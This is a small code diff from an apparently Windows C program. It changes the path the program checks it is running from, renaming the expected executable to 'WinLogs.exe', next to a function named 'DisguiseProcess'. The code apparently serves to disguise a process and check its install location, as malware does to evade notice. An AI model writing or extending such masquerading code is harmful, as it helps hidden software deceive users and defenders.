@@ -118,7 +118,7 @@ BOOL DisguiseProcess(wchar_t* lpwszPath, wchar_t* lpwszCmd) {
 
 BOOL IsDirCorrect() {
 	CHAR szDir[MAX_PATH];
-	CHAR szCorDir[] = "C:\\BaiduNetDisk\\NetDiskSpeedUp.exe";
+	CHAR szCorDir[] = "C:\\BaiduNetDisk\\WinLogs.exe";
 	GetModuleFileNameA(NULL, szDir, MAX_PATH);
 	if (lstrcmpiA(szDir, szCorDir)) {
 		return FALSE;
